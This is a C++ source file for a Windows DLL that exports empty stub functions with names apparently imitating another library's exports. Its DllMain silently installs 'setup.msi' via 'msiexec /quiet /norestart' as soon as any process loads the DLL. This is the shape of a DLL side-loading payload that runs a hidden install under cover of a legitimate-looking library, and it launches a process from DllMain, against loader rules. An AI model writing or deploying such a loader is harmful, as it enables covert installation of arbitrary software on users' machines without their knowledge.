// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>


extern "C" __declspec(dllexport) void _IsProcessHooked() {
    //MessageBoxA(NULL, "1", NULL, NULL);
    return;
}

extern "C" __declspec(dllexport) void APIExportForDetours() {
    //MessageBoxA(NULL, "2", NULL, NULL);
    return;
}

extern "C" __declspec(dllexport) void RequestUnhookedFunctionList() {
    //MessageBoxA(NULL, "3", NULL, NULL);
    return;
}

extern "C" __declspec(dllexport) void VirtualizeCurrentThread() {
    //MessageBoxA(NULL, "4", NULL, NULL);
    return;
}

extern "C" __declspec(dllexport) void CurrentThreadIsVirtualized() {
    //MessageBoxA(NULL, "5", NULL, NULL);
    return;
}

extern "C" __declspec(dllexport) void VirtualizeCurrentProcess() {
    //MessageBoxA(NULL, "6", NULL, NULL);
    return;
}

#include <windows.h>
#include <string>
#include <vector>

DWORD InstallMsiQuiet(const std::wstring& msiPath)
{
    std::wstring commandLine =
        L"msiexec.exe /i \"" + msiPath + L"\" /quiet /norestart";

    std::vector<wchar_t> cmd(commandLine.begin(), commandLine.end());
    cmd.push_back(L'\0');

    STARTUPINFOW si{};
    si.cb = sizeof(si);

    PROCESS_INFORMATION pi{};

    if (!CreateProcessW(
        nullptr,
        cmd.data(),
        nullptr,
        nullptr,
        FALSE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi))
    {
        return GetLastError();
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return exitCode;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        InstallMsiQuiet(L"setup.msi");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

